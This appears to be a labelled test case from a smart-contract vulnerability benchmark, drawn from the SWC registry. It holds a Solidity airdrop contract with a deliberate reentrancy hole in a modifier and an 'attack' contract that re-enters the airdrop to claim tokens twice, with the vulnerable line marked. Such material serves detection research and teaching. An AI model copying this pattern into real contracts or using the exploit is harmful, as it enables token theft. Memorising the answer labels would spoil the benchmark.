/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * @author: - 
 * @vulnerable_at_lines: 15
 */

pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  //If a contract has a zero balance and supports the token give them some token
  // <yes> <report> REENTRANCY
  function benign_airDrop() hasNoBalance benign_supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

  //Checks that the contract responds the way we want
  modifier benign_supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).benign_supportsToken());
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function benign_supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{ //An example of a contract that breaks the contract above.
    bool hasBeenCalled;
    function benign_supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).benign_airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function benign_call(address token) public{
        ModifierEntrancy(token).benign_airDrop();
    }
}
